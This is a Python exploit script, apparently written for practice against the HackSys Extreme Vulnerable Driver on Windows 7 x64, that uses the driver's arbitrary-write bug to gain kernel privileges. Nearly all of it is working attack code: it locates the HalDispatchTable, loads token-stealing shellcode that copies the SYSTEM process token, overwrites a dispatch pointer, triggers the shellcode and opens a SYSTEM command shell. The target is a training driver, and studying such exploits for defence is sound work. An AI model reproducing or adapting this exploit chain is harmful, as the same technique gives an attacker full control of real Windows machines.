#Purpose: HEVD - Arbitrary Overwrite 
#Platform: Windows 7 X64
#Written By: Eric Van Zutphen

import os, sys, struct
from ctypes import *
from ctypes.wintypes import *
from subprocess import *

#Function Proxies
kernel32 = windll.kernel32
ntdll = windll.ntdll
GetProcAddress = windll.kernel32.GetProcAddress
ProcessStatusAPI = windll.psapi

#Constants
PAGE_EXECUTE_READWRITE = 0x00000040
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000


class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

def banner():
    logo = """
HEVD - HackSys Exteme Vulnerable Driver
Bug: Arbitrary Overwrite
Written By: Eric Van Zutphen
Platform: Windows 7 X64
    """
    return logo

def debug_print(message):
    print(message)

    # void WINAPI OutputDebugString(
    #   _In_opt_ LPCTSTR lpOutputString
    # );

    kernel32.OutputDebugStringA(message + "\n")

def get_device_handle(device):
    open_existing = 0x3
    generic_read = 0x80000000
    generic_write = 0x40000000

    # HANDLE WINAPI CreateFile(
    #   _In_     LPCTSTR               lpFileName,
    #   _In_     DWORD                 dwDesiredAccess,
    #   _In_     DWORD                 dwShareMode,
    #   _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    #   _In_     DWORD                 dwCreationDisposition,
    #   _In_     DWORD                 dwFlagsAndAttributes,
    #   _In_opt_ HANDLE                hTemplateFile
    # );

    # get the device handle
    handle = kernel32.CreateFileA(device,
                                  generic_read | generic_write,
                                  None,
                                  None,
                                  open_existing,
                                  None,
                                  None)

    if not handle:
        debug_print("\t[*] Unable to get device handle")
        sys.exit(-1)
    return handle



def close_handle(handle):
    # BOOL WINAPI CloseHandle(
    #   _In_ HANDLE hObject
    # );

    # close the device handle
    return kernel32.CloseHandle(handle)

def get_hal_dispatch_table():
    global HAL_plus_8
    cb = c_int(1024)
    cb_needed = c_longlong()
    image_base = (c_ulonglong * 1024)()
    # BOOL WINAPI EnumDeviceDrivers(
    # _Out_ LPVOID  *lpImageBase,
    #   _In_  DWORD   cb,
    #   _Out_ LPDWORD lpcbNeeded
    # );
    # enumerate the loaded device drivers
    #Enumerate for the HALDispatchTable
    enumerate = ProcessStatusAPI.EnumDeviceDrivers(byref(image_base), cb, byref(cb_needed))
    if not enumerate:
        print "[*] Enumeration Device Drivers Failed! [*]"
        sys.exit(-1)
    for address in image_base:
        if not address:
            continue
        get_base_name = c_char_p('\x00' * 1024)
        # DWORD WINAPI GetDeviceDriverBaseName(
        #   _In_  LPVOID ImageBase,
        #   _Out_ LPTSTR lpBaseName,
        #   _In_  DWORD  nSize
        # );
        ProcessStatusAPI.GetDeviceDriverBaseNameA.argtypes = [c_longlong, POINTER(c_char), c_uint32]
        get_driver_base_name =	ProcessStatusAPI.GetDeviceDriverBaseNameA(address, get_base_name, 48)
        if not get_driver_base_name:
            print "[*] Unable to Get Driver Base Name [*]"
            sys.exit(-1)
        if get_base_name.value.lower() == 'krnl' or 'krnl' in get_base_name.value.lower():
            base_name = get_base_name.value
            print "[*] Loaded Kernel: {0} ".format(base_name)
            print "[*] Base Address of Loaded Kernel: {0} ".format(hex(address))
            break
        else:
            print "[*] Unable to Get Kernel Base Name [*]"
	
    kernel32.LoadLibraryExA.restype = c_uint64
    kernel_handle = kernel32.LoadLibraryExA('ntoskrnl.exe', None, 0x00000001)
    if not kernel_handle:
        print "Unable to get Kernel Handle"
        sys.exit(-1)
    GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
    GetProcAddress.restype = c_uint64
    hal_address = GetProcAddress(kernel_handle,"HalDispatchTable")
    # Subtracting ntkrnlpa base in user space
    hal_address -= kernel_handle 
    # To find the HalDispatchTable address in kernel space, add the base address of ntkrnpa in kernel space
    hal_address += address
    # Just add 0x4 to HAL address for HalDispatchTable+0x4
    HAL_plus_8 = hal_address + 0x8
    print "[+] HalDispatchTable    : {0}".format(hex(hal_address))
    print "[+] HalDispatchTable+0x8: {0}".format(hex(HAL_plus_8))


def write_shellcode():
    global shellcode_final_address
    #System Token Stealing Payload
    print "[+] Writing Stealing SYSTEM Token To Memory"
    shellcode = bytearray(  "\x48\x31\xc0"                         # xor rax, rax          ; Zero Out rax
                            "\x65\x48\x8b\x04\x25\x88\x01\x00\x00" # mov rax, [gs:188h]            ; Get nt!_KPCR.PcrbData.CurrentThread
                            "\x48\x8b\x40\x70"             # mov rax, [rax + 70h]          ; Get nt!_KTHREAD.ApcState.Process  
                            "\x48\x89\xc1"             # mov rcx, rax                      ; Copy current process _EPROCESS structure  
                            "\x49\x89\xcb"             # mov r11, rcx                      ; Store Token.RefCnt
                            "\x49\x83\xe3\x07"             # and r11, 7        
                            "\xba\x04\x00\x00\x00"         # mov rdx, 4h                       ; WIN 7 SP1 SYSTEM process PID = 0x4
                            "\x48\x8b\x80\x88\x01\x00\x00"     # mov rax, [rax + 188h]             ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
                            "\x48\x2d\x88\x01\x00\x00"         # sub rax, 188h
                            "\x48\x39\x90\x80\x01\x00\x00"     # cmp[rax + 180h], rdx              ; Get nt!_EPROCESS.UniqueProcessId
                            "\x75\xea"                 # jne   -22 <.text+0x1f>
                            "\x48\x8b\x90\x08\x02\x00\x00"         # mov rdx, [rax + 208h]             ; Get SYSTEM process nt!_EPROCESS.Token 
                            "\x48\x83\xe2\xf0"             # and rdx, 0fffffffffffffff0h   
                            "\x4c\x09\xda"             # or rdx, r11   
                            "\x48\x89\x91\x08\x02\x00\x00"     # mov[rcx+ 208h], rdx               ; Replace target process nt!_EPROCESS.Token
                            "\x48\x83\xc4\x20"             # add rsp, 28           ; Align the Stack
                            "\xc3")                 # retq
    #---------------------------------------------------------[Structure]-#
    # LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
    #   _In_opt_  LPVOID lpAddress,       => None                         #
    #   _In_      SIZE_T dwSize,          => dwSize (??) Shellcode Length #
    #   _In_      DWORD flAllocationType, => flAllocationType (0x3000)    #
    #   _In_      DWORD flProtect         => flProtect (0x40) Page Execute#
    # );                                                                  #
    #---------------------------------------------------------------------#
    ptr = kernel32.VirtualAlloc(0,len(shellcode),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)   
    buff = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
    final_exploit = struct.pack("<Q",ptr)
    shellcode_address = id(shellcode) + 32
    shellcode_final = struct.pack("<Q",ptr)
    shellcode_final_address = id(final_exploit) + 32 
    print "[+] Address of ring0 shellcode: {0}".format(hex(shellcode_address))
    print "[+] Pointer for ring0 shellcode: {0}".format(hex(shellcode_final_address))


if __name__ == "__main__":

    debug_print(banner())
    bytes_returned = c_ulong()
    ioctl_arbitrary_overwrite = 0x0022200B
    device_name = "\\\\.\\HackSysExtremeVulnerableDriver"
    get_hal_dispatch_table()
    write_shellcode()
    www = WriteWhatWhere()
    www.What = shellcode_final_address
    www.Where = HAL_plus_8
    p_www = pointer(www)
    debug_print("[+] What : {0}".format(hex(www.What)))
    debug_print("[+] Where: {0}".format(hex(www.Where)))
    device_handle = get_device_handle(device_name)
    success = kernel32.DeviceIoControl(device_handle,ioctl_arbitrary_overwrite,p_www,0x10,None,0,byref(bytes_returned),None)
    debug_print("[+] Closing device handle")
    if not close_handle(device_handle):
        debug_print("\t[-] Unable to close device handle")
    ntdll.NtQueryIntervalProfile(0x1337, byref(c_ulong()))
    Popen("start cmd", shell=True)
    debug_print("[+] Arbitrary Memory Overwrite Complete")
    debug_print("[+] Checking Privileges...")    
